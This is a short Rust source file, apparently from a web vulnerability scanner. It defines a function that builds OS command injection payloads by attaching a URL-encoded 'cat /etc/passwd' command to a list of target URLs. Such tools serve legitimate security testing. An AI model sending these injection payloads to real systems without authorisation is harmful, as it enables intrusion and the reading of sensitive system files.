
use crate::objects::payload;
use crate::gen::utils;

pub fn generate_oscip(urls: &[String]) -> Vec<payload::Payload> {
    let script = r#"cat%20/etc/passwd"#;
    utils::generate_p(urls, script)
}

